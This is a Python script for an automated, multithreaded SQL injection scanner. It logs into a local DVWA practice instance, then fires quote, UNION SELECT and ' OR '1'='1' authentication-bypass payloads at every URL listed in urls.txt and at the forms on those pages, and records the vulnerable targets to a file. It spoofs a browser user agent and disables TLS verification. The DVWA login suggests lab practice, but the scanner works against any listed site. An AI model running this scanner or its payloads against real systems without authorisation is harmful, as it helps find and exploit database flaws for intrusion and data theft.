import requests
import threading
import time
import warnings
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore

# Function to login to DVWA
def login_dvwa(session, url, username, password):
    login_url = urljoin(url, 'login.php')
    login_data = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    response = session.post(login_url, data=login_data)
    if "login" in response.url:
        print(f"{Fore.RED}[CONSOLE] Login failed. Check credentials.")
    else:
        print(f"{Fore.GREEN}[CONSOLE] Login successful.")

def get_all_forms(url):
    r = s.get(url)
    soup = BeautifulSoup(r.content, "lxml")
    return soup.find_all("form")

def get_details(form):
    details = {}
    try:
        act = form.attrs.get("action").lower()
    except:
        act = None

    method = form.attrs.get("method", "get").lower()
    
    inputs = []
    for tag in form.find_all("input"):
        input_type = tag.attrs.get("type", "text")
        input_value = tag.attrs.get("value", "")
        input_name = tag.attrs.get("name")
        inputs.append({"type": input_type, "value": input_value, "name": input_name})
    details["method"] = method
    details["action"] = act
    details["inputs"] = inputs
    return details

def is_vuln(response):
    errors = {
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
    }
    try:
        for e in errors:
            if e in response.content.decode().lower():
                return True
        return False
    except UnicodeDecodeError:
        return False
    except requests.exceptions.RequestException:
        pass

def scan_sql_inj(url):
    f = open("vuln.txt", "a+")
    try:
        for b in "\"'":
            new_url = f"{url}{b}"
            print(f"{Fore.WHITE}[CONSOLE] Trying: {new_url}")
            r = s.get(new_url)
            if is_vuln(r):
                print(f"{Fore.GREEN}[CONSOLE] Found SQL injection vulnerability! " + new_url.strip(f"{b}"))
                f.write(new_url.strip(f"{b}") + "\n")
                f.close()
                return
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[CONSOLE] Request exception: {e}")

    try:
        forms = get_all_forms(url)
        print(f"{Fore.CYAN}[CONSOLE] Detected {len(forms)} forms on {url}")
        for form in forms:
            form_details = get_details(form)
            
            # Test for UNION-based SQL injection
            if test_union_based_sqli(url):
                return

            # Test for second-order SQL injection
            if test_second_order_sqli(url, form_details):
                return

            # Continue with original payloads
            for b in "\"'":
                data = {}
                for tag in form_details['inputs']:
                    if tag["type"] == "hidden" or tag["value"]:
                        try:
                            data[tag["name"]] = tag["value"] + b
                        except:
                            pass
                    elif tag["type"] != "submit":
                        data[tag["name"]] = f"test{b}"
                form_url = urljoin(url, form_details["action"])
                if form_details["method"] == "post":
                    r = s.post(form_url, data=data)
                elif form_details["method"] == "get":
                    r = s.get(form_url, params=data)

                if is_vuln(r):
                    print(f"{Fore.GREEN}[CONSOLE] Found SQL injection vulnerability in form! " + form_url.strip(f"{b}"))
                    f.write(form_url.strip(f"{b}") + "\n")
                    return
                else:
                    print(f"{Fore.WHITE}[CONSOLE] No vulnerability found for {form_url} with payload {b}")
        f.close()
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[CONSOLE] Request exception: {e}")

def test_union_based_sqli(url):
    union_payloads = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL, NULL--"
    ]
    for payload in union_payloads:
        new_url = f"{url}{payload}"
        print(f"{Fore.WHITE}[CONSOLE] Trying UNION-based payload: {new_url}")
        r = s.get(new_url)
        if is_vuln(r):
            print(f"{Fore.GREEN}[CONSOLE] Found UNION-based SQL injection vulnerability! " + new_url.strip(f"{payload}"))
            with open("vuln.txt", "a+") as f:
                f.write(new_url.strip(f"{payload}") + "\n")
            return True
    return False

def test_second_order_sqli(url, form_details):
    for b in "\"'":
        data = {}
        for tag in form_details['inputs']:
            if tag["type"] == "hidden" or tag["value"]:
                try:
                    data[tag["name"]] = tag["value"] + b
                except:
                    pass
            elif tag["type"] != "submit":
                data[tag["name"]] = f"test{b}"
        form_url = urljoin(url, form_details["action"])
        if form_details["method"] == "post":
            r = s.post(form_url, data=data)
        elif form_details["method"] == "get":
            r = s.get(form_url, params=data)

        # Assume the second-order SQLi is triggered by visiting another page or reloading
        r2 = s.get(url)
        if is_vuln(r2):
            print(f"{Fore.GREEN}[CONSOLE] Found second-order SQL injection vulnerability in form! " + form_url.strip(f"{b}"))
            with open("vuln.txt", "a+") as f:
                f.write(form_url.strip(f"{b}") + "\n")
            return True
    return False

def test_authentication_bypass(url):
    auth_payloads = [
        "' OR '1'='1' --",
        "' OR '1'='1' (#",
        "' OR '1'='1' /*",
        "' OR 1=1 --",
        "' OR 1=1 (#",
        "' OR 1=1 /*"
    ]
    for payload in auth_payloads:
        auth_url = f"{url}/login.php"
        data = {
            'username': payload,
            'password': 'anything'
        }
        print(f"{Fore.WHITE}[CONSOLE] Trying authentication bypass payload: {payload}")
        r = s.post(auth_url, data=data)
        if "welcome" in r.text.lower():
            print(f"{Fore.GREEN}[CONSOLE] Authentication bypass successful with payload: {payload}")
            with open("vuln.txt", "a+") as f:
                f.write(f"Authentication bypass successful with payload: {payload}\n")
            return True
    return False

def start_scan():
    global checked
    try:
        threads = []
        with open('urls.txt', 'r') as f:
            R = f.readlines()
            for _ in range(thr):
                if checked < len(R):
                    for url in R:
                        time.sleep(delay)
                        t = threading.Thread(target=scan_sql_inj, args=(url.strip(),))
                        t.start()
                        checked += 1
                        threads.append(t)

                    for t in threads:
                        t.join()
        f.close()
    except FileNotFoundError:
        print(f"{Fore.RED}[CONSOLE] Please create 'urls.txt' and add the URLs to it.")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[CONSOLE] Request exception: {e}")

def start_sql_():
    global thr, delay, checked, s
    warnings.filterwarnings('ignore', message='Unverified HTTPS request')

    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"

    # Disable SSL verification warnings
    s.verify = False

    # Login to DVWA
    dvwa_url = 'http://127.0.0.1:42001/'
    dvwa_username = 'admin'
    dvwa_password = 'password'
    login_dvwa(s, dvwa_url, dvwa_username, dvwa_password)

    thr = 10  # Set number of threads
    delay = 0  # Set delay between requests

    checked = 0
    start_scan()

# Start the SQL injection scan process
start_sql_()
